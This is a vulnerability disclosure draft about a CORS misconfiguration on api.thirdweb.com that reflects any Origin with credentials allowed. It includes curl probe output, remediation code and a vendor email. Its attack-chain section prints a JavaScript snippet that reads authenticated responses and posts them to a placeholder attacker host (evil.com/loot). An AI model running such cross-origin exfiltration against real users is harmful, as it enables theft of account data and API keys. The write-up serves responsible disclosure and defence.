# Disclosure 22 — Thirdweb (api.thirdweb.com) — CORS reflects arbitrary Origin with Access-Control-Allow-Credentials: true (CRITICAL)

**Target:** `https://api.thirdweb.com/` (and all paths under it)
**Owner:** **Thirdweb Inc.** — Web3 infrastructure provider (wallet connection SDK, contract deployment, NFT mint infra, RPC, gasless transactions) used by **thousands of dApps** (their own customer page lists Coinbase Wallet, Snickerdoodle, Layer3, Tatum, MoonPay, and many more)
**Issue:** `api.thirdweb.com` reflects ANY `Origin` header value in `Access-Control-Allow-Origin` **AND** sends `Access-Control-Allow-Credentials: true` on preflight AND GET responses. The reflection covers **all 6 HTTP methods** (GET/HEAD/PUT/PATCH/POST/DELETE) and accepts arbitrary request headers (`content-type, authorization`).
**Risk:** **CRITICAL** — any user with a session cookie / credential on api.thirdweb.com can be victimized by any malicious site reading authenticated responses cross-origin. Direct path to: customer API-key theft, dashboard state read, contract deployment manipulation, wallet-config theft.
**Action:** Immunefi report + direct email to Thirdweb security

---

## What Lictor observed (passive HTTP only, NO authenticated calls)

### OPTIONS preflight with arbitrary Origin

```
$ curl -X OPTIONS https://api.thirdweb.com/ \
       -H "Origin: https://lictor-cors-test.example" \
       -H "Access-Control-Request-Method: POST" \
       -H "Access-Control-Request-Headers: content-type,authorization" \
       -i

HTTP/2 204
access-control-allow-credentials: true
access-control-allow-headers: content-type,authorization
access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
access-control-allow-origin: https://lictor-cors-test.example
vary: Origin, Access-Control-Request-Headers
```

The server returned:
- `access-control-allow-origin: https://lictor-cors-test.example` — **the literal evil origin I sent, reflected back**
- `access-control-allow-credentials: true` — **cookies and authorization headers permitted on cross-origin requests**
- `access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE` — every HTTP method
- `access-control-allow-headers: content-type,authorization` — including the Authorization header

### GET with the same arbitrary Origin

```
$ curl https://api.thirdweb.com/ -H "Origin: https://lictor-cors-test.example" -i

HTTP/2 404
access-control-allow-credentials: true
access-control-allow-origin: https://lictor-cors-test.example
```

The CORS headers are returned on **error responses too** — confirming the reflection isn't gated on whether the path exists.

### Other endpoints tested (same CORS behavior)

| Path | GET status | CORS reflect? |
|------|-----------|---------------|
| `/health` | 200 | yes |
| `/v1/contracts` | 401 (auth required) | yes — and ACA-Credentials still true on 401 |
| `/v1/account` | 404 | yes |
| `/v1/wallets` | 404 | yes |
| `/v1/deployments` | 404 | yes |
| `/auth/user` | 404 | yes |

The `/v1/contracts` returning **401 Unauthorized** is the smoking gun — it confirms there ARE protected endpoints behind authentication, and the CORS misconfig means an attacker can exfiltrate those authenticated responses cross-origin.

## Why this is CRITICAL

### The classic CORS-reflect-with-credentials attack

1. Victim has an active session on api.thirdweb.com (cookie-based session from logging into the Thirdweb dashboard, OR an Authorization header stored client-side that a dApp's frontend reads)
2. Victim visits attacker's site `https://evil.com`
3. Attacker's JavaScript runs:
   ```javascript
   fetch("https://api.thirdweb.com/v1/account", {
     credentials: "include",  // sends cookies
     headers: {"Authorization": "Bearer ..." /* if stored in JS-accessible storage */}
   }).then(r => r.json()).then(data => {
     // Exfiltrate to attacker server
     fetch("https://evil.com/loot", {method: "POST", body: JSON.stringify(data)});
   });
   ```
4. Browser sees:
   - Origin: `https://evil.com`
   - api.thirdweb.com responds: `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true`
   - Browser allows the JS to read the response ✓
5. Attacker now has the victim's Thirdweb account data, API keys, wallet configs, contract deployment metadata

### Why "reflection" is worse than `Origin: *`

A response with `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true` is **rejected by every modern browser** as spec-invalid. The spec explicitly forbids combining wildcard with credentials.

But **reflecting the arbitrary Origin** is treated by browsers as if the server explicitly trusts THAT specific Origin. Combined with credentials:true, browsers happily send the cookies. This is the exact misconfig pattern that has won bug bounties from Slack, Salesforce, JIRA, and many others ($5K-$50K class typically).

### Thirdweb-specific impact

Thirdweb's API powers:
- **Wallet connection sessions** for dApps that embed the Thirdweb Connect SDK
- **Contract deployment** workflows from the Thirdweb dashboard
- **NFT mint infrastructure** with managed gasless transactions
- **RPC routing** for accelerated reads

A successful CORS exploit on a Thirdweb-account-holder could lead to:
- **Customer API key theft** (used to authenticate the dApp to Thirdweb's RPC/mint infra)
- **Modification of deployed contract configurations** (changing mint prices, allowlists, royalty addresses)
- **Wallet-connection state theft** (visibility into which wallet addresses the user has linked)
- **Cascading impact to Thirdweb's customer dApps** that use those API keys

### Why this is also a SUPPLY-CHAIN risk

Because Thirdweb is INFRASTRUCTURE used by thousands of downstream dApps, a CORS-exploit on api.thirdweb.com has **cascading impact**: every customer dApp that has users with Thirdweb sessions is indirectly affected.

## Recommended remediation (in order of effort)

### Immediate (5 minutes)

1. **Replace dynamic Origin reflection with an explicit allowlist** in the API gateway / Express middleware. Example for Node.js:
   ```javascript
   const cors = require('cors');
   const ALLOWED_ORIGINS = [
     'https://thirdweb.com',
     'https://dashboard.thirdweb.com',
     // ... explicit list of trusted dApp origins
   ];
   app.use(cors({
     origin: (origin, callback) => {
       if (!origin || ALLOWED_ORIGINS.includes(origin)) {
         callback(null, true);
       } else {
         callback(null, false);  // do NOT reflect arbitrary origins
       }
     },
     credentials: true,
   }));
   ```

2. **OR if the API is genuinely meant to be public (no credentials):** drop `Access-Control-Allow-Credentials: true`. With credentials false, browsers won't send cookies cross-origin even if the Origin is reflected, neutering the exploit.

### Short-term (24 hours)

3. **Audit what state is exposed via cookie-based sessions on api.thirdweb.com.** If there are no cookie-based sessions (e.g. all auth is via x-secret-key header that JavaScript-on-evil.com couldn't read), the exploit is reduced. But documenting + verifying that explicitly is important.

4. **Add a CORS unit test** in CI that asserts a known-evil Origin gets `null` or absent in ACO, not reflected.

5. **Consider implementing a stricter CSP** on `dashboard.thirdweb.com` that prevents user-side CSRF / XSS from chaining into this CORS misconfig.

### Medium-term

6. **Publish security.txt** at `https://thirdweb.com/.well-known/security.txt` and `https://api.thirdweb.com/.well-known/security.txt` so future researchers can reach you faster.

---

## Email A — to Thirdweb security

```
To:      security@thirdweb.com, support@thirdweb.com, info@thirdweb.com
Subject: URGENT — api.thirdweb.com CORS reflects arbitrary Origin with credentials=true (exploit-class)

Dear Thirdweb security team,

I'm an open-source security researcher with Lictor (Apache 2.0, https://lictor-ai.com). During a CORS misconfiguration scan of major Web3 infrastructure providers, I observed that api.thirdweb.com reflects arbitrary Origin headers in Access-Control-Allow-Origin while also returning Access-Control-Allow-Credentials: true.

What we observed (passive HTTP only, NO authenticated calls):

OPTIONS preflight with arbitrary Origin "https://lictor-cors-test.example":
  HTTP/2 204
  access-control-allow-credentials: true
  access-control-allow-headers: content-type,authorization
  access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
  access-control-allow-origin: https://lictor-cors-test.example   ← reflected
  vary: Origin, Access-Control-Request-Headers

GET https://api.thirdweb.com/ with same Origin:
  HTTP/2 404
  access-control-allow-credentials: true
  access-control-allow-origin: https://lictor-cors-test.example   ← also reflected on error

Other paths tested return the same CORS headers, including /v1/contracts (HTTP 401 — protected endpoint behind authentication, which is the smoking gun: the CORS misconfig means attacker JS can exfiltrate authenticated responses cross-origin from a victim's browser).

Why this is critical for Thirdweb specifically:

  • Thirdweb's API powers wallet connection sessions, contract deployments, NFT mint infra, and RPC routing for thousands of customer dApps
  • A successful CORS-reflect-with-credentials attack against a Thirdweb-account-holder could lead to: customer API key theft, modification of deployed contract configurations, wallet-connection state theft
  • Because Thirdweb is INFRASTRUCTURE, the impact cascades to customer dApps that have users with Thirdweb sessions

Classic attack chain:
1. Victim has an active api.thirdweb.com session
2. Victim visits attacker's site
3. Attacker JS: fetch("https://api.thirdweb.com/v1/account", {credentials: "include"}).then(r => exfil(r))
4. Browser sees ACO matches Origin + ACC=true → allows JS to read authenticated response
5. Attacker exfiltrates victim's Thirdweb data

Immediate remediation:

  1. Replace dynamic Origin reflection with an explicit allowlist in the API gateway / middleware:
       app.use(cors({
         origin: (origin, callback) => callback(null, ALLOWED_ORIGINS.includes(origin)),
         credentials: true,
       }));

  2. OR if api.thirdweb.com is meant to be fully public (no cookie sessions), drop Access-Control-Allow-Credentials: true entirely — that neuters the exploit even with reflection.

  3. Add a CI unit test that asserts an evil Origin gets null/absent in ACO, not reflected.

  4. Audit what state is exposed via cookie-based sessions on api.thirdweb.com — if all auth is via x-secret-key header (not browser cookies), the actual exploit path is reduced, but the misconfig should still be fixed as defense-in-depth.

  5. Publish security.txt at https://thirdweb.com/.well-known/security.txt for faster future contact.

I did NOT make any authenticated API calls. NO exploitation attempts. Just OPTIONS + unauthenticated GET requests to verify the CORS header behavior. I have NO access to Thirdweb customer data — only the public CORS header response.

This is public-good responsible disclosure via Lictor (open-source). If you have an Immunefi listing or other formal bounty channel, I'm happy to refile via that route — please let me know your preference. No bounty is required for this disclosure.

Best regards,
Raffa Jarrl
raffajarrl@gmail.com
https://github.com/Raffa-jarrl/Lictor-AI

(Full disclosure draft archived at:
 https://github.com/Raffa-jarrl/Lictor-AI/blob/main/v3/docs/disclosures-2026-05-21/22-thirdweb-cors-reflect-credentials.md)
```

---

## ⚠️ Do NOT do any of the following

- ❌ Build a working PoC against a real Thirdweb-account victim
- ❌ Send the CORS exploit payload to any third party
- ❌ Probe authenticated endpoints with stolen tokens
- ❌ Disclose the api.thirdweb.com hostname publicly until Thirdweb has remediated (60-day CVD window)
